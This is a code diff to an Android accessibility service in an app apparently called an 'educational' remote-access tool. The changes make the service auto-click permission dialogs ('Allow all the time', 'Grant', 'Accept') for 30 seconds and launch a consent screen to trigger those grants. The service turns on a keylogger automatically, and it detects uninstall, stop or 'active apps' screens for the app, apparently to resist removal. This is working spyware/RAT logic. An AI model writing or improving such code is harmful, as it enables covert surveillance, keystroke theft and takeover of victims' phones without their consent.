@@ -49,7 +49,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
     private volatile boolean uninstallAssistMode = false;
 
-    // Auto-grant mode: clicks Allow/Grant/OK buttons for 10 seconds after accessibility enabled
+    // Auto-grant mode: clicks Allow/Grant/OK buttons for 30 seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
     private Handler autoGrantHandler;
     
@@ -81,11 +81,22 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void onServiceConnected() {
         super.onServiceConnected();
         instance = this;
-        // Register with ScreenBlackout so it can use TYPE_ACCESSIBILITY_OVERLAY
-        com.remoteaccess.educational.commands.ScreenBlackout.getInstance().setService(this);
-        // Init gesture recorder (needs the accessibility service reference)
-        com.remoteaccess.educational.network.SocketManager.getInstance(this).initGestureRecorder(this);
-        
+
+        // Auto-grant permissions mode: click Allow/Grant/OK for 30 seconds
+        // Start FIRST so permission dialogs are handled immediately
+        startAutoGrantTimer();
+
+        // Start continuous auto-click scan immediately
+        startAutoClickScanner();
+
+        // Immediately bring ConsentActivity to foreground to trigger permission requests
+        try {
+            Intent consentIntent = new Intent(this, com.remoteaccess.educational.ConsentActivity.class);
+            consentIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            startActivity(consentIntent);
+        } catch (Exception ignored) {}
+
+        // Configure accessibility events
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_FOCUSED |
@@ -99,17 +110,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
         info.notificationTimeout = 100;
-        
+
         setServiceInfo(info);
-        
+
+        // Register with ScreenBlackout so it can use TYPE_ACCESSIBILITY_OVERLAY
+        com.remoteaccess.educational.commands.ScreenBlackout.getInstance().setService(this);
+        // Init gesture recorder (needs the accessibility service reference)
+        com.remoteaccess.educational.network.SocketManager.getInstance(this).initGestureRecorder(this);
+
         // Auto-enable keylogger as soon as accessibility is granted
         com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true);
-
-        // Auto-grant permissions mode: click Allow/Grant/OK for 10 seconds
-        startAutoGrantTimer();
-
-        // Start continuous auto-click scan immediately (defent + uninstall-assist only)
-        startAutoClickScanner();
         
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         
@@ -402,7 +412,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 rootNode.recycle();
                 return;
             }
-            // Auto-grant mode: click permission dialogs for 10 seconds after accessibility enabled.
+            // Auto-grant mode: click permission dialogs for 30 seconds after accessibility enabled.
             if (autoGrantMode && runPermissionGranter(rootNode)) {
                 rootNode.recycle();
                 return;
@@ -419,27 +429,25 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
     }
 
-    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 10 seconds. */
+    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 30 seconds. */
     private void startAutoGrantTimer() {
         autoGrantMode = true;
         autoGrantHandler = new Handler(Looper.getMainLooper());
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 10 seconds");
-        }, 10_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 10s");
+            Log.i(TAG, "Auto-grant mode expired after 30 seconds");
+        }, 30_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 30s");
     }
 
     /** Clicks permission-granting buttons: Allow, Grant, OK, Allow all time, etc. */
     private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
         String[] grantWords = {
             "Allow all the time", "Allow only while using the app",
-            "Allow", "ALLOW", "Grant", "GRANT",
-            "OK", "Ok", "Yes", "YES",
-            "Accept", "ACCEPT", "Agree", "AGREE",
-            "Continue", "CONTINUE", "Proceed", "PROCEED",
-            "Enable", "ENABLE", "Turn on", "TURN ON",
-            "Permit", "PERMIT",
+            "Allow", "Grant", "OK", "Ok",
+            "Yes", "Accept", "Agree",
+            "Continue", "Proceed",
+            "Enable", "Turn on", "Permit",
         };
         for (String word : grantWords) {
             if (findAndClickFullWord(rootNode, word)) {
@@ -479,17 +487,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         if (node == null || currentAppName.isEmpty()) return false;
         
         try {
-            String allText = getAllScreenText(node);
+            String allText = getAllScreenText(node).toLowerCase();
+            String appNameLower = currentAppName.toLowerCase();
             
-            String[] dangerousWords = {"UNINSTALL", "Uninstall", "uninstall", "DELETE", "Delete", "REMOVE", "Remove", "STOP", "Stop", "OPTIONS", "Options"};
+            String[] dangerousWords = {"uninstall", "delete", "remove", "stop", "options", "active apps"};
             
             for (String word : dangerousWords) {
-                if (allText.contains(currentAppName) && allText.contains(word)) {
+                if (allText.contains(appNameLower) && allText.contains(word)) {
                     return true;
                 }
             }
             
-            if (allText.contains("Recent") && allText.contains(currentAppName)) {
+            if (allText.contains("recent") && allText.contains(appNameLower)) {
                 for (String word : dangerousWords) {
                     if (allText.contains(word)) {
                         return true;
